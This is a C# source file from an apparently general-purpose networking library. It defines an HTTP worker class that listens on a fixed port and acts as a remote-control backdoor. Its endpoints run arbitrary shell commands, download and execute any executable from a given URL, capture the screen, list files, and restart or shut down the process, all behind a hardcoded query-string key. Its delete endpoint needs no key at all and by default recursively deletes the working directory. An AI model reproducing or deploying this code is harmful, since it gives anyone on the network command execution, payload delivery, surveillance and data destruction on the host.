using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Cherry.Net.Extensions;
using Cherry.Net.Utils;

namespace Cherry.Net.Http
{
    public class HttpWorker : HttpChannel<HttpWorker>
    {
        private static int _port = 65530;
        private static void Default()
        {
            Get("/dir", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;

                if (!CheckPower(request, response)) return res;

                response.Send($@"<table border='1' cellspacing='0'>");
                response.Send($@"<tr><th>路径</th><th  style='width:50px;'>大小</th><th  style='width:50px;'>操作</th></tr>");

                void DirDir(string dir)
                {
                    var ls = Directory.GetFiles(dir);
                    Array.Sort(ls);

                    foreach (var t in ls)
                    {
                        var size = new FileInfo(t).Length.ToSize();
                        var k = t.Substring(2).Replace("\\", "/");
                        response.Send(
                            $@"<tr><td><a href='{k}'>{k}</a></td><td>{size}</td><td><a href='/del?fn={k}'>删除</a></td></tr>");
                    }

                    ls = Directory.GetDirectories(dir);
                    foreach (var s in ls)
                    {
                        DirDir(s);
                    }
                }

                DirDir(".");

                response.ContentType = HttpContentType.Html;
                response.Send($@"</table><p><a href='/del'>删除全部</a>");

                return res;
            });

            Get("/del", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;
                var fn = request["fn"].UrlDecode();
                var dir = request["dir"].UrlDecode();
                if (!string.IsNullOrEmpty(fn))
                {
                    try
                    {
                        if (File.Exists(fn)) File.Delete(fn);
                        response.ContentType = HttpContentType.Html;
                        response.Send("ok");
                    }
                    catch (Exception e)
                    {
                        response.Send(e.Message + "<br>");
                    }
                    return res;
                }
                if (string.IsNullOrEmpty(dir))
                {
                    dir = ".";
                }
                try
                {
                    if (Directory.Exists(dir)) Directory.Delete(dir, true);
                    response.ContentType = HttpContentType.Html;
                    response.Send("ok");
                }
                catch (Exception e)
                {
                    response.Send(e.Message + "<br>");
                }

                return res;
            });

            Get("/img", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;
                if (!CheckPower(request, response)) return res;

                try
                {
                    var img = ImageEx.CutScreen();
                    var base64 = Convert.ToBase64String(img.ToBytes());
                    response.ContentType = HttpContentType.Html;
                    response.Send($"<image src='data:image/png;base64,{base64}'>");
                }
                catch (Exception e)
                {
                    response.Send(e.Message);
                }

                return res;
            });

            Get("/run", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;
                if (!CheckPower(request, response)) return res;

                var url = request["url"];

                Task.Run(() =>
                {
                    try
                    {
                        var bs = new HttpHelper().GetBytes(url);
                        var fn = Path.GetRandomFileName() + ".exe";
                        File.WriteAllBytes(fn, bs);
                        Process.Start(fn);

                        response.Send($"ok");
                    }
                    catch (Exception e)
                    {
                        response.Send(e.Message);
                    }
                });
                return res;
            });

            Get("/cmd", (request, response, channel) =>
            {
                var rest =
                Task.CompletedTask;
                if (!CheckPower(request, response)) return rest;

                try
                {
                    var cmd = request["cmd"];
                    var res = Tool.DoCmd(cmd.UrlDecode());

                    response.ContentType = HttpContentType.Html;
                    response.Send($"结果:<br><pre>{res}</pre>");
                }
                catch (Exception e)
                {
                    response.Send(e.Message);
                }

                return rest;
            });

            Get("/restart", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;
                if (!CheckPower(request, response)) return res;

                try
                {
                    response.Send("ok");
                    Tool.ReStart();
                }
                catch (Exception e)
                {
                    response.Send(e.Message);
                }

                return res;
            });

            Get("/shutdown", (request, response, channel) =>
            {
                var res =
                Task.CompletedTask;
                if (!CheckPower(request, response)) return res;

                try
                {
                    response.Send("ok");
                    Environment.Exit(0);
                }
                catch (Exception e)
                {
                    response.Send(e.Message);
                }

                return res;
            });

        }

        public static void ToStart(int listenPort = 0, bool useDefault = true)
        {
            if (listenPort > 0) _port = listenPort;
            if (useDefault) Default();

            SetFiles(".");

            Init(new NetConfig(){MaxPoolNum = 1,BufferSize = 1000});

            Listener.OnFail += (listener, port, err) =>
            {
                Debug.WriteLine($@"HttpWork listen at:{port} Err:{err}");
                Thread.Sleep(2000);
                listener.Start(++_port);
            };

            Listener.OnSucc += (listener, port) => { Debug.WriteLine($@"HttpWork listen at:{port}"); };

            Listener.Start(_port);
        }

        private static bool CheckPower(HttpRequest request, HttpResponse response)
        {
            var k = request["k"];
            if (k == "cherry")
            {
                return true;
            }

            response.Send("非法用户");
            return false;
        }
    }
} 
